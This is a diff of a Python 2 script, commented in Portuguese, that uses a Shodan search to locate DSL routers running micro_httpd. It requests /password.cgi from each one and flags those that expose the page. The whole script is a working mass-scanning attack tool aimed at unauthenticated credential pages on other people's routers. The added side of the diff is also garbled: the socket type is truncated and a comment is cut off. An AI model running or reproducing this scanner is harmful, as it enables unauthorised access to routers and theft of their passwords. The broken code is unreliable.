@@ -28,7 +28,7 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 #Api Key Shodan
-key = "suakey"
+key = "SUA KEY AQUI"
  
 os.system('clear')
 print '               _       _    '
@@ -42,45 +42,31 @@ print ' /----------------------------'
  
 def checar(ip):
          try:
-                 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
- 
+                 sock = socket.socket(socket.AF_INET,socket.SOCK
                  sock.settimeout(1.5)
- 
                  sock.connect((ip,80))
- 
                  sock.send('GET /password.cgi HTTP/1.0\r\n\r\n')
- 
                  res = sock.recv(100)
- 
-
                  if(res.find('200 Ok') > 0):
- 
                          return True
- 
                  return False
  
          except:
- 
                  return False
 
 if __name__ == "__main__":
-	
-api = WebAPI(key)
-res = api.search('DSL Router micro_httpd')#Dork shodan dos modelos vulneraveis
-i = 1
-try:
-         while i <= 100: #Vai printar apenas 100 resultados pela API ser free
- 
-                 for ips in res['matches']:
- 
-                         print '[!] Testando http://%s' % ips['ip'] + bcolors.WARNING +' | Localizado em: ' + bcolors.ENDC + ips['country_name'] + bcolors.WARNING + ' | na porta:'+ bcolors.ENDC, bcolors.OKBLUE, ips['port'], bcolors.ENDC
- 
-                         if(checar(ips['ip'])):
-							 
-                                 print '[+] Is vull: http://%s/password.cgi' % ips['ip']
-                                               
-                 i +=1												
-except():
-         print 'Failed'
+        api = WebAPI(key)
+        res = api.search('DSL Router micro_httpd')#Dork shodan dos modelos vulneraveis
+        i = 1
+        try:
+                 while i <= 100: #Vai printar apenas 100 resulta
+                         for ips in res['matches']:
+                                 print '[!] Testando http://%s' % ips['ip'] + bcolors.WARNING +' | Localizado em: ' + bcolors.ENDC + ips['country_name'] + bcolors.WARNING + ' | na porta:'+ bcolors.ENDC, bcolors.OKBLUE, ips['port'], bcolors.ENDC
+         
+                                 if(checar(ips['ip'])):
+                                         print '[+] Is vull: http://%s/password.cgi' % ips['ip']
+                         i +=1
+        except():
+                 print 'Failed'
  
  
